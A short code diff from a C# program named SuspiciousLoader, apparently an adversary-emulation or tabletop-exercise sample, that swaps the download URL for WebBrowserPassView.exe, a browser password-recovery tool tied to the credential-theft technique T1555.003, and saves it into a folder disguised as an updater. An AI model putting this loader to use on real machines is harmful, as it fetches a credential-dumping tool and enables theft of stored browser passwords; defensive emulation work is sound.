@@ -24,7 +24,7 @@ namespace SuspiciousLoader
                 Directory.CreateDirectory(updater);
 
                 // 3) Download WebBrowserPassView.exe into that folder
-                string wbpvUrl   = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe";
+                string wbpvUrl   = "https://github.com/ttx-playground/TTX/blob/main/WebBrowserPassView.exe";
                 string wbpvExe   = Path.Combine(updater, "WebBrowserPassView.exe");
                 using (var wc = new WebClient())
                     wc.DownloadFile(wbpvUrl, wbpvExe);
